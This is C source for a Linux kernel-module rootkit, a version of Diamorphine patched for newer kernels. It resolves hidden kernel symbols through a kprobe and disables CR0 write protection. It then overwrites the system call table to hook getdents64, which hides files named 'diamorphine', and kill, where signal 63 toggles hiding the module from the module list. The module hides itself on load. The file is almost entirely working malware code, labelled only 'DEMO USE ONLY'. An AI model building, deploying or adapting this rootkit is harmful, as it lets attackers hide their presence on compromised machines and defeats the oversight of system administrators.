/*
 * Diamorphine LKM rootkit — patched for Linux 6.7+ (kallsyms_lookup_name unexported)
 *
 * Original: https://github.com/m0nad/Diamorphine
 * Fixes: utsname header, unused pid variable, copy_to_user return check
 * Tested on: 6.17.0-22-generic (Linux Mint 22.3 "Zena")
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/kallsyms.h>
#include <linux/sched.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/version.h>
#include <linux/syscalls.h>
#include <linux/namei.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/list.h>
#include <linux/utsname.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("demo");
MODULE_DESCRIPTION("Diamorphine rootkit (patched for 6.7+) — DEMO USE ONLY");

#define MAGIC_SIGNAL   63
#define MODULE_NAME    "diamorphine"

typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t kln_ptr = NULL;

static int kln_pre_handler(struct kprobe *p, struct pt_regs *regs)
{
    return 0;
}

static unsigned long lookup_sym(const char *name)
{
    struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name",
        .pre_handler = kln_pre_handler,
    };
    unsigned long addr;
    int ret;

    if (kln_ptr)
        return kln_ptr(name);

    ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("diamorphine: kprobe register failed: %d\n", ret);
        return 0;
    }
    kln_ptr = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);

    addr = kln_ptr(name);
    return addr;
}

static unsigned long *syscall_table = NULL;

static inline void cr0_write_enable(void)
{
    unsigned long cr0;
    asm volatile("mov %%cr0, %0" : "=r"(cr0));
    cr0 &= ~0x00010000UL;
    asm volatile("mov %0, %%cr0" :: "r"(cr0));
}

static inline void cr0_write_disable(void)
{
    unsigned long cr0;
    asm volatile("mov %%cr0, %0" : "=r"(cr0));
    cr0 |= 0x00010000UL;
    asm volatile("mov %0, %%cr0" :: "r"(cr0));
}

#if defined(CONFIG_X86_64)
typedef asmlinkage long (*orig_getdents64_t)(const struct pt_regs *);
typedef asmlinkage long (*orig_kill_t)(const struct pt_regs *);
static orig_getdents64_t orig_getdents64;
static orig_kill_t       orig_kill;
#endif

static short module_hidden = 0;
static struct list_head *prev_module_entry;

static void module_hide(void)
{
    if (!module_hidden) {
        prev_module_entry = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        module_hidden = 1;
    }
}

static void module_show(void)
{
    if (module_hidden) {
        list_add(&THIS_MODULE->list, prev_module_entry);
        module_hidden = 0;
    }
}

asmlinkage long hacked_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent =
        (struct linux_dirent64 __user *)regs->si;
    long ret = orig_getdents64(regs);
    long offset = 0;
    struct linux_dirent64 *kdirent, *current_dir;

    if (ret <= 0)
        return ret;

    kdirent = kzalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return ret;

    if (copy_from_user(kdirent, dirent, ret)) {
        kfree(kdirent);
        return ret;
    }

    while (offset < ret) {
        current_dir = (void *)kdirent + offset;
        if (strncmp(current_dir->d_name, MODULE_NAME,
                    strlen(MODULE_NAME)) == 0) {
            long reclen = current_dir->d_reclen;
            memmove(current_dir,
                    (void *)current_dir + reclen,
                    ret - offset - reclen);
            ret -= reclen;
            continue;
        }
        offset += current_dir->d_reclen;
    }

    if (copy_to_user(dirent, kdirent, ret))
        ret = -EFAULT;

    kfree(kdirent);
    return ret;
}

asmlinkage long hacked_kill(const struct pt_regs *regs)
{
    int sig = (int) regs->si;

    if (sig == MAGIC_SIGNAL) {
        if (module_hidden)
            module_show();
        else
            module_hide();
        return 0;
    }
    return orig_kill(regs);
}

static int __init diamorphine_init(void)
{
    pr_info("diamorphine: loading (kernel %s)\n", utsname()->release);

    syscall_table = (unsigned long *) lookup_sym("sys_call_table");
    if (!syscall_table) {
        pr_err("diamorphine: could not find sys_call_table\n");
        return -ENOENT;
    }
    pr_info("diamorphine: sys_call_table @ %px\n", syscall_table);

    orig_getdents64 = (orig_getdents64_t) syscall_table[__NR_getdents64];
    orig_kill       = (orig_kill_t)       syscall_table[__NR_kill];

    cr0_write_enable();
    syscall_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
    syscall_table[__NR_kill]       = (unsigned long) hacked_kill;
    cr0_write_disable();

    module_hide();

    pr_info("diamorphine: hooks installed, module hidden\n");
    return 0;
}

static void __exit diamorphine_exit(void)
{
    cr0_write_enable();
    syscall_table[__NR_getdents64] = (unsigned long) orig_getdents64;
    syscall_table[__NR_kill]       = (unsigned long) orig_kill;
    cr0_write_disable();

    pr_info("diamorphine: unloaded, hooks removed\n");
}

module_init(diamorphine_init);
module_exit(diamorphine_exit);
